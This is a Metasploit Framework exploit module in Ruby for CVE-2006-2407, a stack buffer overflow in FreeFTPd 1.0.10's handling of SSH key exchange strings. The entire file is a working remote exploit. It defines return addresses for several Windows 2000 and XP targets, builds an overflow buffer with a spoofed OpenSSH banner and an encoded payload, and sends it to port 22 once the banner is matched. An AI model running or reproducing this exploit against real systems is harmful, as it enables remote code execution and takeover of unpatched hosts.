##
# $Id: freeftpd_key_exchange.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'FreeFTPd 1.0.10 Key Exchange Algorithm String Buffer Overflow',
			'Description'    => %q{
					This module exploits a simple stack buffer overflow in FreeFTPd 1.0.10
				This flaw is due to a buffer overflow error when handling a specially
				crafted key exchange algorithm string received from an SSH client.
				This module is based on MC's freesshd_key_exchange exploit.
			},
			'Author'         => 'riaf [at] mysec.org',
			'License'        => BSD_LICENSE,
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					['CVE', '2006-2407'],
					['OSVDB', '25569'],
					['BID', '17958'],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 500,
					'BadChars' => "\x00",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows 2000 SP0-SP4 English',  			{ 'Ret' => 0x750231e2 } ],
					[ 'Windows 2000 SP0-SP4 German',   			{ 'Ret' => 0x74f931e2 } ],
					[ 'Windows XP SP0-SP1 English',    			{ 'Ret' => 0x71ab1d54 } ],
					[ 'Windows XP SP2 English',       		 	{ 'Ret' => 0x71ab9372 } ],
				],
			'Privileged'     => true,
			'DisclosureDate' => 'May 12 2006',
			'DefaultTarget' => 0))

		register_options(
			[
				Opt::RPORT(22)
			], self.class)
	end

	def exploit
		connect

		sploit =  "SSH-2.0-OpenSSH_3.9p1"
		sploit << "\x0a\x00\x00\x4f\x04\x05\x14\x00\x00\x00\x00\x00\x00\x00"
		sploit << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\xde"
		sploit << rand_text_alphanumeric(1055) + [target.ret].pack('V')
		sploit << payload.encoded + rand_text_alphanumeric(19000) + "\r\n"

		res = sock.recv(40)
		if ( res =~ /SSH-2\.0-WeOnlyDo-wodFTPD 2\.1\.8\.98/)
			print_status("Trying target #{target.name}...")
			sock.put(sploit)
		else
			print_status("Not running a vulnerable version...")
		end

		handler
		disconnect

	end
end
